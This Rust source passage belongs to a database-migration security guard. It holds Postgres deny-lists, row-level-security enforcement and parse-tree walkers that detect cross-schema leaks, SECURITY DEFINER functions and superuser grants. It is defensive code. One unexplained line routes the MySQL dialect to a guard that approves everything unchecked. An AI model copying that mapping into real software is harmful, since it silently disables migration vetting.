    let has_set_not_null = report
        .classes
        .iter()
        .any(|c| matches!(c.kind, DdlKind::SetNotNull));
    MigrationFlags {
        transactional: !non_transactional,
        destructive: report.destructive,
        online: false,
        requires_approval: report.destructive || has_rename || has_set_not_null,
        // No per-migration timeout derivable from a single SQL blob; the author
        // sets it explicitly when a long backfill/index needs a higher ceiling.
        timeout_ms: None,
        // Likewise the per-migration lock-acquisition budget (the maintenance-
        // window override) is authoring-time, never inferred from a SQL blob —
        // defaults to the SHORT executor-wide lock-safety default.
        lock_timeout_ms: None,
        // A guard-derived flag set is for one-shot SQL; the online expand/contract
        // phase is set by the ExpandContractAuthor, never inferred from SQL.
        phase: None,
        // Repeatable is an authoring-time facet (a stable-identity, replace-style
        // R__ migration), not derivable from a single SQL blob — defaults off.
        repeatable: false,
        // Engine-goodie DDL (the SQLite FTS5 vtable) is an authoring-time facet set
        // by the declarative author on the FTS migration it emits; a guard-derived
        // flag set for an arbitrary SQL blob never carries it.
        engine_goodie_ddl: false,
    }
}

// ---------------------------------------------------------------------------
// The per-engine line-1 guard seam (multi-engine abstraction, P0 / design
// 2026-06-21 §2.2 L3).
// ---------------------------------------------------------------------------

/// The **dialect-neutral** result of a passing [`MigrationGuard::check`].
///
/// This is the line-1 output the core engine actually consumes: the engine's
/// `plan()`/`apply` only read `destructive` (to drive the destructive/approval
/// gate) and `advisories` (to surface operational footguns) — see
/// [`crate::engine::MigrationEngine::plan`]. Deliberately **does not** carry the
/// PG-specific `classes: Vec<StatementClass>` (the libpg_query `DdlKind`
/// vocabulary): that stays *inside* the PG guard ([`SqlGuard`]/[`GuardReport`]),
/// because a non-PG engine (SQLite descriptor diff, a future non-PG parser) has no
/// `DdlKind` to populate. Keeping the neutral seam free of PG vocabulary (H2) is
/// what lets a new engine bring its own line-1 without inheriting libpg_query.
///
/// The PG-only consumers of `classes` ([`flags_for`], the author/submit/loader
/// flag derivation, the `guard_security` matrix) keep calling [`SqlGuard::check`]
/// directly and keep the rich [`GuardReport`]; only the engine seam is neutral.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct GuardOutcome {
    /// True if *any* statement is destructive (data loss). The engine's gate
    /// decides on approval; the guard only flags.
    pub destructive: bool,
    /// Operational [`Advisory`](crate::analyze::Advisory)s (lock-heavy ops,
    /// backward-incompatible shapes, missing FK indexes, …). Advisory-only —
    /// never deny or gate. Empty for engines that emit none (e.g. SQLite's
    /// descriptor path).
    pub advisories: Vec<Advisory>,
}

/// The **per-engine line-1 defense**, behind a trait so the core engine never
/// selects it by dialect (`if dialect == Sqlite`) — it asks [`guard_for`] and
/// runs whatever line-1 that engine brings.
///
/// - **Postgres** ([`PgGuard`]) — the libpg_query parse + deny-list + classify +
///   analyze ([`SqlGuard`]), mapped onto the neutral [`GuardOutcome`].
/// - **SQLite** ([`SqliteDescriptorGuard`]) — the descriptor-diff path is trusted
///   by construction (validated at the author boundary, line-2 enforced by the
///   `SqliteBackend` authorizer at apply), so `check` returns the **empty/clean**
///   outcome. The raw-untrusted-SQL fail-closed (libpg_query cannot vet SQLite)
///   lives on [`SqlGuard::check`] itself — if the PG guard is ever mis-handed a
///   SQLite-keyed config it returns [`GuardError::SqliteRawSqlRejected`] rather
///   than mis-parsing (the existing defensive property).
/// - A future non-PG engine brings its own parser/allowlist impl.
///
/// `GuardOutcome` / [`GuardError`] are shared + neutral; each engine's parser is
/// its own concern (design §2.2 / §6 G1).
pub trait MigrationGuard {
    /// Run line-1 over a migration's `up` SQL. `Ok(GuardOutcome)` when every
    /// statement is safe (destructive ops flagged, not denied); `Err` on the
    /// first hard-denied / cross-tenant / unparseable / raw-rejected construct.
    ///
    /// # Errors
    /// Engine-specific: PG surfaces [`GuardError::Denied`] /
    /// [`GuardError::CrossSchema`] / [`GuardError::Parse`]; SQLite's descriptor
    /// path does not deny (it trusts), so its `check` is infallible in practice.
    fn check(&self, up: &str) -> Result<GuardOutcome, GuardError>;
}

/// The Postgres line-1: the existing [`SqlGuard`] (libpg_query deny-list +
/// cross-schema confinement + classify + analyze) behind [`MigrationGuard`].
/// Behavior-identical to calling [`SqlGuard::check`] — `check` only drops the
/// PG-specific `classes` from the returned report (the neutral seam, H2).
#[derive(Debug, Clone)]
pub struct PgGuard(SqlGuard);

impl PgGuard {
    /// Wrap a [`SqlGuard`] as the Postgres [`MigrationGuard`].
    #[must_use]
    pub const fn new(inner: SqlGuard) -> Self {
        Self(inner)
    }

    /// Build the PG guard from a [`GuardConfig`] (the common case).
    #[must_use]
    pub const fn from_config(cfg: GuardConfig) -> Self {
        Self(SqlGuard::new(cfg))
    }
}

impl MigrationGuard for PgGuard {
    fn check(&self, up: &str) -> Result<GuardOutcome, GuardError> {
        let report = self.0.check(up)?;
        // Drop the PG-specific `classes`; expose only the neutral fields the
        // engine seam consumes (H2). `flags_for` and the other `classes`
        // consumers call `SqlGuard::check` directly, never through this seam.
        Ok(GuardOutcome {
            destructive: report.destructive,
            advisories: report.advisories,
        })
    }
}

/// The SQLite line-1: the descriptor-diff path is **trusted by construction**.
///
/// SQLite migrations are produced ONLY by the declarative differ
/// ([`crate::render::declarative::DeclarativeAuthor::diff`]) — there is no raw-SQL SQLite
/// author. libpg_query cannot parse SQLite, so there is no string deny-list to
/// run; the line-1 vet is the descriptor emitter at the author boundary and the
/// line-2 defense is the `SqliteBackend`'s runtime authorizer applied per
/// statement at execution (design §2.5.3). So `check` returns the **empty**
/// [`GuardOutcome`] — exactly the pre-seam `plan_sqlite_trusted` report + the
/// executor's `run_string_guard == false` skip, now expressed as a per-engine
/// guard instead of an `if dialect == Sqlite` branch.
///
/// (The raw-untrusted-SQL fail-closed — refusing a hand-written SQLite string
/// handed to the *PG* guard — stays on [`SqlGuard::check`] as
/// [`GuardError::SqliteRawSqlRejected`]; that defensive property is unchanged.)
#[derive(Debug, Clone, Copy, Default)]
pub struct SqliteDescriptorGuard;

impl SqliteDescriptorGuard {
    /// Construct the SQLite descriptor guard (stateless).
    #[must_use]
    pub const fn new() -> Self {
        Self
    }
}

impl MigrationGuard for SqliteDescriptorGuard {
    fn check(&self, _up: &str) -> Result<GuardOutcome, GuardError> {
        // Descriptor-diff-generated DDL is trusted (author boundary line-1 +
        // backend authorizer line-2). No string check, no denial — the empty
        // clean outcome. Destructive/approval flags come from the migration's
        // OWN author flags, combined by the engine's `plan()`, not from here.
        Ok(GuardOutcome::default())
    }
}

/// Select the per-engine line-1 [`MigrationGuard`] for a [`GuardConfig`]'s
/// dialect.
///
/// Postgres → [`PgGuard`] (libpg_query deny-list); SQLite → [`SqliteDescriptorGuard`]
/// (trusted descriptor path). This replaces the `if dialect == Sqlite` branch in
/// `plan()` — the core no longer knows SQLite by name; it asks for the dialect's
/// guard and runs it uniformly.
#[must_use]
pub fn guard_for(cfg: &GuardConfig) -> Box<dyn MigrationGuard> {
    match cfg.dialect() {
        SqlDialect::Postgres => Box::new(PgGuard::from_config(cfg.clone())),
        SqlDialect::Sqlite => Box::new(SqliteDescriptorGuard::new()),
        SqlDialect::Mysql => Box::new(SqliteDescriptorGuard::new()),
    }
}

/// A data-security policy failure attributed to an IR op index.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct IrDataSecurityError {
    /// The op that violated the data-security policy.
    pub op_index: usize,
    /// The guard policy error.
    pub source: GuardError,
}

/// Enforce data-security knobs that require the structured IR op set.
///
/// `require_rls` is a cross-op obligation over the migration's final table RLS
/// state, not a textual co-occurrence rule. Any table this migration creates and
/// leaves present must end RLS-enabled; any attempt to turn RLS/force off while
/// the profile obligates RLS is refused outright. Raw SQL islands are rejected
/// under this obligation because the guard cannot enumerate their net table
/// state fail-closed.
pub(crate) fn check_ir_data_security_policy(
    cfg: &GuardConfig,
    ir: &MigrationIr,
) -> Result<(), IrDataSecurityError> {
    if !cfg.require_rls {
        return Ok(());
    }

    let mut tables: BTreeMap<(String, String), RlsTableState> = BTreeMap::new();
    for (op_index, op) in ir.ops.iter().enumerate() {
        match op {
            Op::CreateTable { name, schema, .. } => {
                let key = table_key_for_policy(cfg, schema, name);
                tables.insert(
                    key,
                    RlsTableState {
                        exists_after: true,
                        rls_enabled: false,
                        last_op_index: op_index,
                        table: name.clone(),
                    },
                );
            }
            Op::EnableRls { table, schema } => {
                let key = table_key_for_policy(cfg, schema, table);
                tables
                    .entry(key)
                    .and_modify(|state| {
                        state.exists_after = true;
                        state.rls_enabled = true;
                        state.last_op_index = op_index;
                        state.table = table.clone();
                    })
                    .or_insert_with(|| RlsTableState {
                        exists_after: true,
                        rls_enabled: true,
                        last_op_index: op_index,
                        table: table.clone(),
                    });
            }
            Op::DisableRls { table, .. } => {
                return Err(IrDataSecurityError {
                    op_index,
                    source: GuardError::DataSecurityPolicy {
                        rule: data_security_rule::REQUIRE_RLS,
                        statement: format!(
                            "disableRls {table:?} is forbidden while data_security.require_rls=true"
                        ),
                    },
                });
            }
            Op::NoForceRls { table, .. } => {
                return Err(IrDataSecurityError {
                    op_index,
                    source: GuardError::DataSecurityPolicy {
                        rule: data_security_rule::REQUIRE_RLS,
                        statement: format!(
                            "noForceRls {table:?} is forbidden while data_security.require_rls=true"
                        ),
                    },
                });
            }
            Op::DropTable { table, schema, .. } => {
                let key = table_key_for_policy(cfg, schema, table);
                tables
                    .entry(key)
                    .and_modify(|state| {
                        state.exists_after = false;
                        state.rls_enabled = false;
                        state.last_op_index = op_index;
                        state.table = table.clone();
                    })
                    .or_insert_with(|| RlsTableState {
                        exists_after: false,
                        rls_enabled: false,
                        last_op_index: op_index,
                        table: table.clone(),
                    });
            }
            Op::RenameTable { table, to, schema, .. } => {
                let from = table_key_for_policy(cfg, schema, table);
                let to_key = table_key_for_policy(cfg, schema, to);
                if let Some(mut state) = tables.remove(&from) {
                    state.last_op_index = op_index;
                    state.table = to.clone();
                    tables.insert(to_key, state);
                }
            }
            Op::PgRaw { .. } => {
                return Err(IrDataSecurityError {
                    op_index,
                    source: GuardError::DataSecurityPolicy {
                        rule: data_security_rule::REQUIRE_RLS,
                        statement: "pgRaw is forbidden while data_security.require_rls=true because raw SQL can create tables outside the structured RLS net-state check".to_string(),
                    },
                });
            }
            _ => {}
        }
    }

    for state in tables.values() {
        if state.exists_after && !state.rls_enabled {
            return Err(IrDataSecurityError {
                op_index: state.last_op_index,
                source: GuardError::DataSecurityPolicy {
                    rule: data_security_rule::REQUIRE_RLS,
                    statement: format!(
                        "table {:?} must end this migration with row level security enabled",
                        state.table
                    ),
                },
            });
        }
    }

    Ok(())
}

#[derive(Debug, Clone)]
struct RlsTableState {
    exists_after: bool,
    rls_enabled: bool,
    last_op_index: usize,
    table: String,
}

fn table_key_for_policy(
    cfg: &GuardConfig,
    schema: &Option<String>,
    table: &str,
) -> (String, String) {
    let effective_schema = schema.clone().unwrap_or_else(|| match &cfg.schemas {
        SchemaScope::Single(project_schema) => project_schema.clone(),
        SchemaScope::Allowlist(list) if list.len() == 1 => list[0].clone(),
        _ => String::new(),
    });
    (effective_schema, table.to_string())
}

// ---------------------------------------------------------------------------
// Deny-by-default allowlist predicates (Root Cause 1)
// ---------------------------------------------------------------------------

/// The `ObjectType`s a creator migration may `DROP`. Anything else (role,
/// schema, extension, FDW, subscription, publication, …) is denied-by-default.
fn is_safe_drop_object(remove_type: i32) -> bool {
    [
        ObjectType::ObjectTable,
        ObjectType::ObjectIndex,
        ObjectType::ObjectView,
        ObjectType::ObjectMatview,
        ObjectType::ObjectSequence,
        ObjectType::ObjectType,
        ObjectType::ObjectDomain,
        ObjectType::ObjectFunction,
        ObjectType::ObjectTrigger,
        ObjectType::ObjectRule,
        ObjectType::ObjectColumn,
    ]
    .iter()
    .any(|t| remove_type == *t as i32)
}

/// Whether the loaded capability composition admits a DROP object class beyond
/// [`is_safe_drop_object`] (design §4.1, the `.down.sql`-only reverses).
fn platform_drop_object_allowed(remove_type: i32, caps: &VendorCapabilities) -> bool {
    if remove_type == ObjectType::ObjectRole as i32 {
        return caps.allow_role;
    }
    if remove_type == ObjectType::ObjectSchema as i32 {
        return caps.allow_schema;
    }
    if remove_type == ObjectType::ObjectExtension as i32 {
        return caps.allow_extension;
    }
    if remove_type == ObjectType::ObjectPolicy as i32 {
        return caps.allow_policy;
    }
    false
}

/// The additional `AlterTableType` subtypes a **Platform** migration may use
/// beyond [`is_safe_alter_table_subtype`] (design §4.1): the four RLS toggles
/// (ENABLE / FORCE / NO FORCE / DISABLE ROW LEVEL SECURITY). Confined never
/// admits these.
fn is_platform_alter_table_subtype(subtype: i32) -> bool {
    use AlterTableType as A;
    [
        A::AtEnableRowSecurity,
        A::AtForceRowSecurity,
        A::AtNoForceRowSecurity,
        A::AtDisableRowSecurity,
    ]
    .iter()
    .any(|t| subtype == *t as i32)
}

/// The `AlterTableType` subcommands a creator migration may use. OWNER TO,
/// INHERIT, REPLICA IDENTITY, generic-options, tablespace moves, etc. are
/// denied-by-default (privilege transfer / cross-tenant reparent / out of
/// remit).
fn is_safe_alter_table_subtype(subtype: i32) -> bool {
    use AlterTableType as A;
    [
        A::AtAddColumn,
        A::AtColumnDefault,
        A::AtCookedColumnDefault,
        A::AtDropNotNull,
        A::AtSetNotNull,
        A::AtSetStatistics,
        A::AtSetOptions,
        A::AtResetOptions,
        A::AtSetStorage,
        A::AtSetCompression,
        A::AtDropColumn,
        A::AtAddIndex,
        A::AtAddConstraint,
        A::AtAlterConstraint,
        A::AtValidateConstraint,
        A::AtAddIndexConstraint,
        A::AtDropConstraint,
        A::AtAlterColumnType,
        A::AtSetRelOptions,
        A::AtResetRelOptions,
        A::AtSetIdentity,
        A::AtDropIdentity,
        A::AtAddIdentity,
        // Partition (de)attach. The partition's RangeVar is walked by
        // `check_cross_schema` independently, so an own-schema partition is
        // safe and a cross-schema one (`… ATTACH PARTITION control.x`) is
        // still denied there.
        A::AtAttachPartition,
        A::AtDetachPartition,
    ]
    .iter()
    .any(|t| subtype == *t as i32)
}

/// Transaction-control kinds a migration may issue. Two-phase commit kinds
/// (`PREPARE TRANSACTION` / `COMMIT PREPARED` / `ROLLBACK PREPARED`) reach the
/// cluster's prepared-transaction namespace and are denied-by-default.
fn is_safe_transaction_kind(kind: i32) -> bool {
    use protobuf::TransactionStmtKind as K;
    [
        K::TransStmtBegin,
        K::TransStmtStart,
        K::TransStmtCommit,
        K::TransStmtRollback,
        K::TransStmtSavepoint,
        K::TransStmtRelease,
        K::TransStmtRollbackTo,
    ]
    .iter()
    .any(|k| kind == *k as i32)
}

/// True if a `CREATE ROLE` / `ALTER ROLE` options list grants the `SUPERUSER`
/// attribute (vendor spec §3.4). The attribute is a `DefElem` named `superuser`
/// with a boolean arg (`SUPERUSER` ⇒ true, `NOSUPERUSER` ⇒ false). Denied in
/// ALL profiles including Platform — superuser is host-reaching, not merely
/// in-DB privilege.
fn role_grants_superuser(options: &[protobuf::Node]) -> bool {
    options.iter().any(|opt| {
        matches!(opt.node.as_ref(), Some(NodeEnum::DefElem(d))
            if d.defname.eq_ignore_ascii_case("superuser")
                && def_elem_bool(d) == Some(true))
    })
}

fn grant_stmt_grants_privileged_role(stmt: &protobuf::GrantStmt) -> bool {
    stmt.is_grant && stmt.grantees.iter().any(node_names_privileged_role)
}

fn grant_role_stmt_grants_privileged_role(stmt: &protobuf::GrantRoleStmt) -> bool {
    stmt.is_grant
        && (stmt.granted_roles.iter().any(node_names_privileged_role)
            || stmt.grantee_roles.iter().any(node_names_privileged_role))
}

fn alter_default_privileges_grants_privileged_role(
    stmt: &protobuf::AlterDefaultPrivilegesStmt,
) -> bool {
    stmt.action
        .as_ref()
        .is_some_and(grant_stmt_grants_privileged_role)
}

fn node_names_privileged_role(node: &protobuf::Node) -> bool {
    match node.node.as_ref() {
        Some(NodeEnum::RoleSpec(role)) => role_spec_names_privileged_role(role),
        // GrantRoleStmt.granted_roles is represented as AccessPriv by the PG AST
        // because of the GRANT privilege-vs-role grammar ambiguity.
        Some(NodeEnum::AccessPriv(role)) => is_privileged_role_name(&role.priv_name),
        Some(NodeEnum::String(s)) => is_privileged_role_name(&s.sval),
        _ => false,
    }
}

fn role_spec_names_privileged_role(role: &protobuf::RoleSpec) -> bool {
    role.roletype == protobuf::RoleSpecType::RolespecCstring as i32
        && is_privileged_role_name(&role.rolename)
}

fn is_privileged_role_name(name: &str) -> bool {
    denylist::list_contains_ci(denylist::PRIVILEGED_ROLES, name)
}

/// True if a CREATE FUNCTION carries the `security` definer option.
fn function_is_security_definer(options: &[protobuf::Node]) -> bool {
    options.iter().any(|opt| {
        matches!(opt.node.as_ref(), Some(NodeEnum::DefElem(d))
            if d.defname.eq_ignore_ascii_case("security")
                && def_elem_bool(d) == Some(true))
    })
}

/// True if a CREATE FUNCTION pins a forbidden `SET <param>` (`search_path`/role).
fn function_sets_forbidden_param(options: &[protobuf::Node]) -> bool {
    options.iter().any(|opt| {
        matches!(opt.node.as_ref(), Some(NodeEnum::DefElem(d))
            if def_elem_is_forbidden_set(d))
    })
}

/// True if any ALTER FUNCTION action is `SECURITY DEFINER`.
fn alter_function_is_security_definer(actions: &[protobuf::Node]) -> bool {
    actions.iter().any(|opt| {
        matches!(opt.node.as_ref(), Some(NodeEnum::DefElem(d))
            if d.defname.eq_ignore_ascii_case("security")
                && def_elem_bool(d) == Some(true))
    })
}

/// True if any ALTER FUNCTION action is a forbidden `SET <param>`.
fn alter_function_sets_forbidden_param(actions: &[protobuf::Node]) -> bool {
    actions.iter().any(|opt| {
        matches!(opt.node.as_ref(), Some(NodeEnum::DefElem(d))
            if def_elem_is_forbidden_set(d))
    })
}

/// A function `DefElem` of the form `SET <param> = …` whose param is in
/// [`denylist::FORBIDDEN_SET_PARAMS`] (e.g. `SET search_path = control`). The
/// nested arg is a `VariableSetStmt` carrying the target param name.
fn def_elem_is_forbidden_set(d: &protobuf::DefElem) -> bool {
    if !d.defname.eq_ignore_ascii_case("set") {
        return false;
    }
    if let Some(NodeEnum::VariableSetStmt(v)) = d.arg.as_ref().and_then(|a| a.node.as_ref()) {
        return denylist::list_contains_ci(denylist::FORBIDDEN_SET_PARAMS, &v.name);
    }
    false
}

/// Read a boolean-valued `DefElem` (the `security` option carries a `Boolean`
/// arg: `SECURITY DEFINER` → true, `SECURITY INVOKER` → false).
fn def_elem_bool(d: &protobuf::DefElem) -> Option<bool> {
    match d.arg.as_ref().and_then(|a| a.node.as_ref()) {
        Some(NodeEnum::Boolean(b)) => Some(b.boolval),
        Some(NodeEnum::Integer(i)) => Some(i.ival != 0),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Generic full-parse-tree JSON walkers (Root Cause 2)
// ---------------------------------------------------------------------------

/// Walk the ENTIRE serialized parse tree and invoke `visit` with the trailing
/// name part of every `FuncCall` / `CallStmt` function name found anywhere
/// (column DEFAULT, CHECK, VALUES lists, RULE actions, sub-selects — every
/// slot, unlike `pg_query::nodes()`). `visit` returns `true` to short-circuit.
fn walk_func_names(v: &Value, visit: &mut dyn FnMut(&str) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            // A FuncCall (or CallStmt's funccall) carries a `funcname` array of
            // String nodes; the trailing element is the bare function name.
            if let Some(Value::Array(parts)) = map.get("funcname") {
                if let Some(name) = json_last_string_part(parts) {
                    if visit(&name) {
                        return true;
                    }
                }
            }
            for child in map.values() {
                if walk_func_names(child, visit) {
                    return true;
                }
            }
            false
        }
        Value::Array(items) => items.iter().any(|i| walk_func_names(i, visit)),
        _ => false,
    }
}

/// Walk the ENTIRE serialized parse tree for `RangeVar` nodes (relation
/// references), invoking `visit(schemaname, relname)` for each. A `RangeVar` is
/// the object carrying a `relname` *and* a `schemaname` sibling. `visit`
/// returns `true` to short-circuit.
fn walk_range_vars(v: &Value, visit: &mut dyn FnMut(&str, &str) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            if let (Some(Value::String(rel)), Some(Value::String(schema))) =
                (map.get("relname"), map.get("schemaname"))
            {
                if visit(schema, rel) {
                    return true;
                }
            }
            map.values().any(|c| walk_range_vars(c, visit))
        }
        Value::Array(items) => items.iter().any(|i| walk_range_vars(i, visit)),
        _ => false,
    }
}

/// Walk the ENTIRE serialized parse tree for `TypeCast` nodes whose target type
/// is `regprocedure`/`regproc`/`regprocedureout`-family and whose argument is a
/// string literal naming a function; invoke `visit` with the leading function
/// identifier of that literal. `visit` returns `true` to short-circuit.
fn walk_regproc_casts(v: &Value, visit: &mut dyn FnMut(&str) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            if let Some(cast) = map.get("TypeCast") {
                if type_is_regproc(cast.get("type_name")) {
                    if let Some(name) = type_cast_string_literal(cast.get("arg")) {
                        if visit(regproc_leading_ident(&name)) {
                            return true;
                        }
                    }
                }
            }
            map.values().any(|c| walk_regproc_casts(c, visit))
        }
        Value::Array(items) => items.iter().any(|i| walk_regproc_casts(i, visit)),
        _ => false,
    }
}

/// Walk the ENTIRE serialized parse tree for the two string-literal-carried
/// schema leaks and invoke `visit` with the literal text:
///   - a `TypeCast` to any [`denylist::REG_TYPES`] member whose argument is a
///     string literal (`'control.users'::regclass`);
///   - a `FuncCall` to any [`denylist::NAME_RESOLVER_FUNCTIONS`] member whose
///     FIRST argument is a string literal (`nextval('control.s')`,
///     `pg_get_serial_sequence('control.t','id')`).
///
/// `visit(literal, is_namespace_resolver)` returns `true` to short-circuit.
/// `is_namespace_resolver` is `true` for `regnamespace` / `to_regnamespace`,
/// where the literal IS a bare schema name (no `schema.object` split); `false`
/// for object resolvers where the schema is the leading `schema.` qualifier.
/// Only literal (`A_Const`) arguments are inspected — runtime-constructed names
/// are not visible at parse time.
fn walk_literal_schema_refs(v: &Value, visit: &mut dyn FnMut(&str, bool) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            if let Some(cast) = map.get("TypeCast") {
                if let Some(reg) = reg_family_name(cast.get("type_name")) {
                    if let Some(lit) = type_cast_string_literal(cast.get("arg")) {
                        if visit(&lit, reg.eq_ignore_ascii_case("regnamespace")) {
                            return true;
                        }
                    }
                }
            }
            if let Some(call) = map.get("FuncCall") {
                if let Some(name) = name_resolver_func(call.get("funcname")) {
                    if let Some(lit) = first_arg_string_literal(call.get("args")) {
                        if visit(&lit, name.eq_ignore_ascii_case("to_regnamespace")) {
                            return true;
                        }
                    }
                }
                // Stat/predicate builtins whose first `text` arg is a relation
                // NAME (`pg_relation_size('control.t')`,
                // `has_table_privilege('control.users','SELECT')`). The schema
                // is the literal's leading `schema.` qualifier — an object
                // resolver, not a namespace one.
                if func_is_text_relation_name(call.get("funcname")) {
                    if let Some(lit) = first_arg_string_literal(call.get("args")) {
                        if visit(&lit, false) {
                            return true;
                        }
                    }
                }
                // Schema-export builtins (`schema_to_xml('control', …)`) whose
                // first `text` arg is a bare SCHEMA NAME — a namespace resolver,
                // like `regnamespace`/`to_regnamespace`.
                if func_is_namespace_name(call.get("funcname")) {
                    if let Some(lit) = first_arg_string_literal(call.get("args")) {
                        if visit(&lit, true) {
                            return true;
                        }
                    }
                }
                // Object-address resolvers carry the schema as the FIRST element
                // of an array literal in the SECOND argument
                // (`pg_get_object_address('table', '{control,t}', …)`). That
                // element IS the schema (like a namespace resolver).
                if func_is_object_address(call.get("funcname")) {
                    if let Some(schema) = object_address_array_schema(call.get("args")) {
                        if visit(&schema, true) {
                            return true;
                        }
                    }
                }
            }
            map.values().any(|c| walk_literal_schema_refs(c, visit))
        }
        Value::Array(items) => items.iter().any(|i| walk_literal_schema_refs(i, visit)),
        _ => false,
    }
}

/// `type_name`'s trailing (bare) name if it is a member of the `reg*`
/// pseudo-type family (`pg_catalog.regclass` resolves the same), else `None`.
fn reg_family_name(type_name: Option<&Value>) -> Option<String> {
    let parts = qualified_list_parts(type_name.and_then(|t| t.get("names")))?;
    let last = parts.last()?;
    denylist::list_contains_ci(denylist::REG_TYPES, last).then(|| last.clone())
}

/// `funcname`'s trailing (bare) name if it is a name-resolving builtin
/// (`pg_catalog.nextval` resolves the same builtin), else `None`.
fn name_resolver_func(funcname: Option<&Value>) -> Option<String> {
    let parts = qualified_list_parts(funcname)?;
    let last = parts.last()?;
    denylist::list_contains_ci(denylist::NAME_RESOLVER_FUNCTIONS, last).then(|| last.clone())
}

/// Is `funcname`'s trailing (bare) name an object-address resolver whose schema
/// rides in an array literal? (`pg_catalog.pg_get_object_address` resolves the
/// same builtin.)
fn func_is_object_address(funcname: Option<&Value>) -> bool {
    let Some(parts) = qualified_list_parts(funcname) else {
        return false;
    };
    parts
        .last()
        .is_some_and(|f| denylist::list_contains_ci(denylist::OBJECT_ADDRESS_FUNCTIONS, f))
}

/// Is `funcname`'s trailing (bare) name a stat/predicate builtin whose first
/// `text` argument is a relation name? (`pg_catalog.pg_relation_size` resolves
/// the same builtin.)
fn func_is_text_relation_name(funcname: Option<&Value>) -> bool {
    let Some(parts) = qualified_list_parts(funcname) else {
        return false;
    };
    parts
        .last()
        .is_some_and(|f| denylist::list_contains_ci(denylist::TEXT_RELATION_NAME_FUNCTIONS, f))
}

/// Is `funcname`'s trailing (bare) name a schema-export builtin whose first
/// `text` argument is a bare schema name? (`pg_catalog.schema_to_xml` resolves
/// the same builtin.)
fn func_is_namespace_name(funcname: Option<&Value>) -> bool {
    let Some(parts) = qualified_list_parts(funcname) else {
        return false;
    };
    parts
        .last()
        .is_some_and(|f| denylist::list_contains_ci(denylist::NAMESPACE_NAME_FUNCTIONS, f))
}

/// The schema element of an object-address call's name array: the SECOND
/// argument is a Postgres array text literal `'{schema,object,…}'` whose first
/// element is the schema. Returns that first element, or `None` if absent.
fn object_address_array_schema(args: Option<&Value>) -> Option<String> {
    let Some(Value::Array(arr)) = args else {
        return None;
    };
    // args[1] is the object-name array literal.
    let second = arr.get(1)?;
    let lit = second
        .get("node")?
        .get("AConst")?
        .get("val")?
        .get("Sval")?
        .get("sval")?
        .as_str()?;
    parse_pg_array_first_element(lit)
}

/// First element of a Postgres array text literal (`{a,b}` → `a`, `{"a b",c}`
/// → `a b`). Best-effort: handles the unquoted and double-quoted element forms.
fn parse_pg_array_first_element(lit: &str) -> Option<String> {
    let inner = lit.trim().strip_prefix('{')?;
    let inner = inner.strip_suffix('}').unwrap_or(inner);
    let inner = inner.trim_start();
    if inner.is_empty() {
        return None;
    }
    let Some(rest) = inner.strip_prefix('"') else {
        // Unquoted element: up to the next comma.
        let first = inner.split(',').next().unwrap_or(inner).trim();
        return if first.is_empty() {
            None
        } else {
            Some(first.to_string())
        };
    };
    // Quoted element: read to the next unescaped quote.
    let mut out = String::new();
    let mut chars = rest.chars();
    while let Some(c) = chars.next() {
        match c {
            '\\' => {
                if let Some(n) = chars.next() {
                    out.push(n);
                }
            }
            '"' => break,
            other => out.push(other),
        }
    }
    Some(out)
}

/// Walk the tree for `set_config(<param-literal>, …)` calls, invoking `visit`
/// with the first string-literal argument (the GUC name). `visit` returns
/// `true` to short-circuit.
fn walk_set_config_calls(v: &Value, visit: &mut dyn FnMut(&str) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            if let Some(call) = map.get("FuncCall") {
                if func_is_set_config(call.get("funcname")) {
                    if let Some(param) = first_arg_string_literal(call.get("args")) {
                        if visit(&param) {
                            return true;
                        }
                    }
                }
            }
            map.values().any(|c| walk_set_config_calls(c, visit))
        }
        Value::Array(items) => items.iter().any(|i| walk_set_config_calls(i, visit)),
        _ => false,
    }
}

/// Walk the tree for `query_to_xml`-family calls (and the rest of
/// [`denylist::SQL_STRING_ARG_FUNCTIONS`]), invoking `visit` with the first
/// string-literal argument (the embedded SQL). `visit` returns `true` to
/// short-circuit.
fn walk_sql_string_arg_calls(v: &Value, visit: &mut dyn FnMut(&str) -> bool) -> bool {
    match v {
        Value::Object(map) => {
            if let Some(call) = map.get("FuncCall") {
                if func_is_sql_string_arg(call.get("funcname")) {
                    if let Some(sql) = first_arg_string_literal(call.get("args")) {
                        if visit(&sql) {
                            return true;
                        }
                    }
                }
            }
            map.values().any(|c| walk_sql_string_arg_calls(c, visit))
        }
        Value::Array(items) => items.iter().any(|i| walk_sql_string_arg_calls(i, visit)),
        _ => false,
    }
}

/// Is `funcname`'s trailing (bare) name a `query_to_xml`-family SQL-string sink?
/// (`pg_catalog.query_to_xml` resolves the same builtin.)
fn func_is_sql_string_arg(funcname: Option<&Value>) -> bool {
    let Some(parts) = qualified_list_parts(funcname) else {
        return false;
    };
    parts
        .last()
        .is_some_and(|f| denylist::list_contains_ci(denylist::SQL_STRING_ARG_FUNCTIONS, f))
}

/// Is `funcname`'s trailing (bare) name `set_config`? (`pg_catalog.set_config`
/// resolves the same builtin.)
fn func_is_set_config(funcname: Option<&Value>) -> bool {
    let Some(parts) = qualified_list_parts(funcname) else {
        return false;
    };
    parts
        .last()
        .is_some_and(|f| f.eq_ignore_ascii_case(denylist::SET_CONFIG_FUNCTION))
}

/// The string-literal value of a `FuncCall.args[0]` (`A_Const { Sval }`), if the
/// first argument is a bare string literal. Each arg is wrapped in a `node`.
fn first_arg_string_literal(args: Option<&Value>) -> Option<String> {
    let Some(Value::Array(arr)) = args else {
        return None;
    };
    let first = arr.first()?;
    first
        .get("node")?
        .get("AConst")?
        .get("val")?
        .get("Sval")?
        .get("sval")?
        .as_str()
        .map(str::to_string)
}

/// The leading `schema.` qualifier of an object-name string literal, or `None`
/// if the literal is unqualified (a bare name) or carries no schema part.
///
/// Drops any argument signature (`schema.f(text)` → schema part of `schema.f`)
/// before splitting, then returns the first dotted component. Honors a
/// double-quoted leading component (`"My Schema".t` → `My Schema`); a leading
/// dot or empty schema yields `None`.
fn literal_schema_qualifier(lit: &str) -> Option<String> {
    // Strip a trailing argument signature (`f(int, text)`) — reg*procedure
    // literals may carry one; the schema is in the head before `(`.
    let head = lit.split('(').next().unwrap_or("").trim();
    if head.is_empty() {
        return None;
